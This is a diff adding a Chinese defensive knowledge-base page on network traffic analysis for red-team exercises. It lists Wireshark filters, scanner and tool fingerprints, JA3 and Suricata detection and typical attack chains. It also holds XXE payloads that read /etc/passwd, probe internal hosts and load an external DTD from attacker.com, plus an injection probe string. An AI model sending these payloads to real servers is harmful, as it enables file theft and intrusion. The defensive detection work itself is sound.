+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                      <div class="code-block">
+                        <div class="lang-label">XXE payload</div>
+                        <pre><code class="language-xml">POST /api/xml HTTP/1.1
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><name>&xxe;</name></root>
+
+# 探测内网
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
+]>
+<root/>
+
+# Blind XXE 带外数据
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<root/></code></pre>
+                      </div>
+                    </div>
+
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                      <div class="space-y-3">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "<?xml"</code>
+                          <p class="text-xs text-gray-500">XML声明</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "DOCTYPE"</code>
+                          <p class="text-xs text-gray-500">文档类型声明</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "ENTITY"</code>
+                          <p class="text-xs text-gray-500">实体声明</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "file://"</code>
+                          <p class="text-xs text-gray-500">文件协议</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "SYSTEM \"http:"</code>
+                          <p class="text-xs text-gray-500">SSRF攻击特征</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "/etc/passwd"</code>
+                          <p class="text-xs text-gray-500">敏感文件读取尝试</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- 扫描器指纹 -->
+          <section id="scanners" class="mb-12" data-toc-id="scanners">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-gray-500/20 flex items-center justify-center">
+                <i data-lucide="scan" class="w-5 h-5 text-gray-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">扫描器与渗透工具指纹</h2>
+            </div>
+
+            <div class="space-y-6">
+              <!-- Nessus -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-blue-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-info">Nessus</span>
+                    Tenable Nessus 漏洞扫描器
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-blue-400 mb-3">流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>User-Agent: <code class="text-green-400">Nessus</code> 相关</li>
+                        <li>请求头包含: <code class="text-green-400">Nessus-Plugin-ID</code></li>
+                        <li>扫描速度较快，短时间内大量请求</li>
+                        <li>常扫描端口: 21, 22, 80, 443, 445, 3306, 5432等</li>
+                        <li>特定插件请求特征</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">筛选命令</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.user_agent contains "Nessus"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.header contains "Nessus-Plugin-ID"</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- AWVS -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-green-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-normal">AWVS</span>
+                    Acunetix Web Vulnerability Scanner
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-green-400 mb-3">流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>User-Agent: <code class="text-green-400">AWVS</code> 或 <code class="text-green-400">acunetix</code></li>
+                        <li>请求头: <code class="text-green-400">X-Requested-With: AWVS</code></li>
+                        <li>大量自动化探测请求</li>
+                        <li>路径特征: /@gebEd/4e127/thickbox/, /.env等</li>
+                        <li>扫描Web漏洞: SQL注入、XSS、文件包含等</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">筛选命令</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.user_agent contains "AWVS"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.user_agent contains "acunetix"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.header contains "X-Requested-With: AWVS"</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- SQLMap -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-red-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-danger">SQLMap</span>
+                    SQL注入检测工具
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-red-400 mb-3">流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>User-Agent包含: <code class="text-green-400">sqlmap</code></li>
+                        <li>请求头: <code class="text-green-400">X-Scanner: sqlmap</code></li>
+                        <li>Cookie中可能包含: <code class="text-green-400">__jsessionid</code></li>
+                        <li>频繁的POST请求带注入测试参数</li>
+                        <li>参数特征: <code class="text-green-400">*</code> (标记注入点)</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">筛选命令</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.user_agent contains "sqlmap"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.header contains "X-Scanner: sqlmap"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.request.uri contains "*"</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Nmap -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-purple-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-purple">Nmap</span>
+                    端口扫描工具
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>TCP SYN扫描: 大量SYN包无后续</li>
+                        <li>TCP连接扫描: 完整三次握手</li>
+                        <li>UDP扫描: ICMP不可达响应</li>
+                        <li>短时间内扫描大量端口</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">筛选命令</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tcp.flags.syn == 1 && tcp.flags.ack == 0</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tcp.analysis.retransmission && tcp.flags.syn == 1</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">frame.time_delta < 0.001 && tcp</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Hydra -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-yellow-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-warning">Hydra</span>
+                    暴力破解工具
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>短时间内大量登录请求</li>
+                        <li>同一账户多次尝试不同密码</li>
+                        <li>常见服务: SSH, FTP, HTTP, SMB, RDP</li>
+                        <li>请求间隔规律(暴力破解特征)</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">筛选命令</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tcp.dstport == 22 && tcp.analysis.retransmission</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.response.code == 401 && frame.time_delta < 1</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">smtp.command contains "AUTH"</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Metasploit -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-red-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-danger">MSF</span>
+                    Metasploit Framework
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-red-400 mb-3">流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>Meterpreter: HTTPS加密传输，心跳间隔固定</li>
+                        <li>Reverse shells: 特定端口(4444等)的外连</li>
+                        <li>漏洞利用载荷有特征可循</li>
+                        <li>User-Agent或请求头可能包含<code class="text-green-400">metasploit</code></li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">筛选命令</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tcp.dstport == 4444</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.user_agent contains "metasploit"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http contains "Meterpreter"</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- PsExec -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-cyan-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-info">PsExec</span>
+                    Windows远程执行工具
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-cyan-400 mb-3">流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>SMB协议通信(端口445)</li>
+                        <li>ADMIN$共享访问</li>
+                        <li>特定命名管道: <code class="text-green-400">PSEXESVC</code></li>
+                        <li>Windows Management Instrumentation (WMI)</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">筛选命令</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tcp.port == 445</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">smb contains "PSEXESVC"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">smb2 contains "ADMIN"</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- 横向移动 -->
+          <section id="lateral" class="mb-12" data-toc-id="lateral">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-emerald-500/20 flex items-center justify-center">
+                <i data-lucide="move-right" class="w-5 h-5 text-emerald-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">横向移动流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-emerald-900/20 to-transparent">
+                  <h3 class="font-bold text-lg">内网横移检测</h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">Pass-the-Hash</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>NTLM认证流量</li>
+                        <li>SMB/LSASS访问</li>
+                        <li>固定时间间隔的认证请求</li>
+                      </ul>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-blue-400 mb-3">WMI横向</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>TCP 135端口(WMI初始化)</li>
+                        <li>动态端口(49152+)数据交换</li>
+                        <li>CIMOM对象访问</li>
+                      </ul>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-red-400 mb-3">RDP横向</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>TCP 3389端口</li>
+                        <li>大量失败登录</li>
+                        <li>异常时间段登录</li>
+                      </ul>
+                    </div>
+                  </div>
+
+                  <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="space-y-2">
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">tcp.dstport == 135 && tcp.len > 0</code>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">tcp.port >= 49152 && tcp.port <= 65535</code>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">smb2 contains "Tree Connect"</code>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">smb contains "NTLMSSP"</code>
+                      </div>
+                    </div>
+                    <div class="space-y-2">
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">tcp.dstport == 3389 && tcp.analysis.retransmission</code>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">tcp.dstport == 3389 && frame.time_delta < 1</code>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">kerberos.CNameString contains "admin"</code>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono">ldap.displayName contains "administrator"</code>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- 加密流量分析 -->
+          <section id="encrypted" class="mb-12" data-toc-id="encrypted">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-violet-500/20 flex items-center justify-center">
+                <i data-lucide="lock" class="w-5 h-5 text-violet-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">加密流量深度分析</h2>
+            </div>
+
+            <div class="space-y-6">
+              <!-- DoH -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-blue-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-info">DoH</span>
+                    DNS over HTTPS 检测
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-blue-400 mb-3">DoH流量特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li>TCP 443端口的HTTPS流量</li>
+                        <li>SNI为已知DoH服务商</li>
+                        <li>域名: <code class="text-green-400">cloudflare-dns.com</code>, <code class="text-green-400">google.com</code>, <code class="text-green-400">dns.google</code></li>
+                        <li>HTTP路径: <code class="text-green-400">/dns-query</code></li>
+                        <li>绕过企业DNS过滤</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选</h4>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tls.handshake.extensions_server_name contains "cloudflare-dns"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tls.handshake.extensions_server_name contains "dns.google"</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">http.request.uri contains "/dns-query"</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- JA3指纹 -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-green-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-normal">JA3</span>
+                    TLS指纹分析与检测
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-green-400 mb-3">JA3/JA3S指纹原理</h4>
+                      <p class="text-sm text-gray-400 mb-4">JA3是对TLS客户端Hello的指纹计算，可识别客户端应用。即使用户-Agent伪造，JA3仍然会暴露真实客户端。</p>
+                      <ul class="text-sm text-gray-400 space-y-2">
+                        <li><strong>JA3</strong>: 客户端Hello指纹(识别浏览器/工具)</li>
+                        <li><strong>JA3S</strong>: 服务器Hello指纹(识别服务类型)</li>
+                        <li>恶意软件有固定JA3指纹</li>
+                        <li>可在威胁情报平台查询已知恶意指纹</li>
+                      </ul>
+                      <div class="code-block mt-3">
+                        <div class="lang-label">常见JA3指纹</div>
+                        <pre><code class="language-bash"># Chrome浏览器
+7732424a97e896723fb30ebcd77e1d4e
+
+# Cobalt Strike (默认)
+af7559582eb1f70f33cf3cfc15b5eb59
+
+# Metasploit Meterpreter
+af7559582eb1f70f33cf3cfc15b5eb59</code></pre>
+                      </div>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">JA3检测方法</h4>
+                      <p class="text-sm text-gray-400 mb-3">Wireshark原生不直接支持JA3筛选，需要通过以下方式：</p>
+                      <ul class="text-sm text-gray-400 space-y-2 mb-3">
+                        <li>1. 使用Suricata规则 <code class="text-green-400"> JA3.hash</code></li>
+                        <li>2. 使用Zeek提取JA3后关联分析</li>
+                        <li>3. 使用Wireshark Lua插件</li>
+                        <li>4. 导出PCAP到本地用Python py JA3库分析</li>
+                      </ul>
+                      <div class="code-block">
+                        <div class="lang-label">Suricata规则示例</div>
+                        <pre><code class="language-bash"># 检测已知恶意JA3
+alert tls any any -> any any (msg:"Cobalt Strike JA3"; \
+  ja3.hash == "af7559582eb1f70f33cf3cfc15b5eb59"; \
+  classtype:trojan-activity; sid:1000001;)</code></pre>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- SSH隧道 -->
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-purple-900/20 to-transparent">
+                  <h3 class="font-bold text-lg flex items-center gap-2">
+                    <span class="badge badge-purple">SSH</span>
+                    SSH隧道与加密隧道检测
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">SSH隧道类型</h4>
+                      <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                        <li><strong>本地端口转发(-L)</strong>: 将本地端口转发到远程</li>
+                        <li><strong>远程端口转发(-R)</strong>: 将远程端口转发到本地</li>
+                        <li><strong>动态SOCKS代理(-D)</strong>: 建立SOCKS代理</li>
+                        <li>用于绕过防火墙、隐蔽通信</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">SSH隧道检测特征</h4>
+                      <ul class="text-sm text-gray-400 space-y-2 mb-3">
+                        <li>TCP 22端口的长时间连接</li>
+                        <li>大量端口转发产生的流量模式</li>
+                        <li>非标准端口但使用SSH协议</li>
+                        <li>长时间持续的心跳流量</li>
+                      </ul>
+                      <div class="space-y-2">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tcp.port == 22 && tcp.analysis.duration > 3600</code>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono">tcp.port == 22 && frame.len < 100 && frame.time_delta > 60</code>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- 攻击链与案例 -->
+          <section id="attack-chain" class="mb-12" data-toc-id="attack-chain">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-rose-500/20 flex items-center justify-center">
+                <i data-lucide="git-branch" class="w-5 h-5 text-rose-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">HW典型攻击链分析</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-rose-900/20 to-transparent">
+                  <h3 class="font-bold text-lg">护网行动常见攻击链</h3>
+                </div>
+                <div class="p-4">
+                  <div class="space-y-6">
+                    <!-- 攻击链1 -->
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-red-400 mb-3">攻击链1: SQL注入 -> WebShell -> 横向移动</h4>
+                      <div class="grid grid-cols-5 gap-2 mb-3">
+                        <div class="text-center p-2 bg-blue-900/30 rounded">
+                          <div class="text-xs text-blue-400">1.侦查</div>
+                          <div class="text-xs text-gray-500">SQL注入探测</div>
+                        </div>
+                        <div class="text-center p-2 bg-yellow-900/30 rounded">
+                          <div class="text-xs text-yellow-400">2.突破</div>
+                          <div class="text-xs text-gray-500">数据库脱库</div>
+                        </div>
+                        <div class="text-center p-2 bg-orange-900/30 rounded">
+                          <div class="text-xs text-orange-400">3.权限</div>
+                          <div class="text-xs text-gray-500">Getshell</div>
+                        </div>
+                        <div class="text-center p-2 bg-purple-900/30 rounded">
+                          <div class="text-xs text-purple-400">4.横移</div>
+                          <div class="text-xs text-gray-500">内网扫描</div>
+                        </div>
+                        <div class="text-center p-2 bg-red-900/30 rounded">
+                          <div class="text-xs text-red-400">5.达成</div>
+                          <div class="text-xs text-gray-500">数据外传</div>
+                        </div>
+                      </div>
+                      <div class="code-block">
+                        <div class="lang-label">关键流量特征</div>
+                        <pre><code class="language-bash"># SQL注入探测
+http contains "id=1' UNION SELECT"
+
+# 上传WebShell
+POST /upload multipart/form-data filename="shell.php"
+
+# 冰蝎连接
+http.user_agent contains "Java/1.8" && http contains "BSESSIONID"
+
+# 内网扫描
+tcp.flags.syn == 1 && tcp.dst == 192.168.1.0/24</code></pre>
+                      </div>
+                    </div>
+
+                    <!-- 攻击链2 -->
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-red-400 mb-3">攻击链2: 钓鱼 -> 木马 -> 持久化 -> 横向移动</h4>
+                      <div class="grid grid-cols-5 gap-2 mb-3">
+                        <div class="text-center p-2 bg-blue-900/30 rounded">
+                          <div class="text-xs text-blue-400">1.侦查</div>
+                          <div class="text-xs text-gray-500">邮件钓鱼</div>
+                        </div>
+                        <div class="text-center p-2 bg-yellow-900/30 rounded">
+                          <div class="text-xs text-yellow-400">2.突破</div>
+                          <div class="text-xs text-gray-500">宏文档执行</div>
+                        </div>
+                        <div class="text-center p-2 bg-orange-900/30 rounded">
+                          <div class="text-xs text-orange-400">3.权限</div>
+                          <div class="text-xs text-gray-500">Cobalt Strike</div>
+                        </div>
+                        <div class="text-center p-2 bg-purple-900/30 rounded">
+                          <div class="text-xs text-purple-400">4.持久化</div>
+                          <div class="text-xs text-gray-500">定时任务</div>
+                        </div>
+                        <div class="text-center p-2 bg-red-900/30 rounded">
+                          <div class="text-xs text-red-400">5.达成</div>
+                          <div class="text-xs text-gray-500">域控沦陷</div>
+                        </div>
+                      </div>
+                      <div class="code-block">
+                        <div class="lang-label">关键流量特征</div>
+                        <pre><code class="language-bash"># 钓鱼邮件(检测附件)
+smtp contains "doc" and smtp contains "macro"
+
+# Cobalt Strike HTTP beacon
+http.host contains "www.google.com"
+http.response.code == 200 && frame.len == 584
+
+# DNS beacon
+dns.qry.name contains "cs." and dns.qry.name matches "^[a-z]+$"
+
+# PsExec横向
+smb contains "PSEXESVC" && ip.src == suspicious_ip</code></pre>
+                      </div>
+                    </div>
+
+                    <!-- 攻击链3 -->
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-red-400 mb-3">攻击链3: 边界突破 -> 内网探测 -> 资源滥用</h4>
+                      <div class="grid grid-cols-5 gap-2 mb-3">
+                        <div class="text-center p-2 bg-blue-900/30 rounded">
+                          <div class="text-xs text-blue-400">1.侦查</div>
+                          <div class="text-xs text-gray-500">VPN爆破</div>
+                        </div>
+                        <div class="text-center p-2 bg-yellow-900/30 rounded">
+                          <div class="text-xs text-yellow-400">2.突破</div>
+                          <div class="text-xs text-gray-500">账户盗用</div>
+                        </div>
+                        <div class="text-center p-2 bg-orange-900/30 rounded">
+                          <div class="text-xs text-orange-400">3.权限</div>
+                          <div class="text-xs text-gray-500">云服务器</div>
+                        </div>
+                        <div class="text-center p-2 bg-purple-900/30 rounded">
+                          <div class="text-xs text-purple-400">4.横移</div>
+                          <div class="text-xs text-gray-500">SSRF/Redis</div>
+                        </div>
+                        <div class="text-center p-2 bg-red-900/30 rounded">
+                          <div class="text-xs text-red-400">5.达成</div>
+                          <div class="text-xs text-gray-500">挖矿/C2</div>
+                        </div>
+                      </div>
+                      <div class="code-block">
+                        <div class="lang-label">关键流量特征</div>
+                        <pre><code class="language-bash"># VPN暴力破解
+tcp.dstport == 443 && tcp.analysis.retransmission && frame.time_delta < 0.1
+
+# 云元数据探测
+http.request.uri contains "169.254.169.254"
+
+# Redis未授权
+tcp.dstport == 6379 && redis.command contains "CONFIG"
+
+# 挖矿通信
+tcp.dstport == 3333 && http contains "stratum"</code></pre>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="border-t border-gray-800 py-8">
+    <div class="max-w-7xl mx-auto px-6">
+      <div class="flex flex-col md:flex-row items-center justify-between gap-4">
+        <div class="flex items-center gap-3">
+          <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center">
+            <i data-lucide="shield-alert" class="w-4 h-4 text-white"></i>
+          </div>
+          <span class="text-sm text-gray-400">HW流量分析知识库</span>
+        </div>
+        <p class="text-xs text-gray-500">仅供安全学习与防御参考，请勿用于非法用途</p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="js/main.js"></script>
+</body>
+</html>
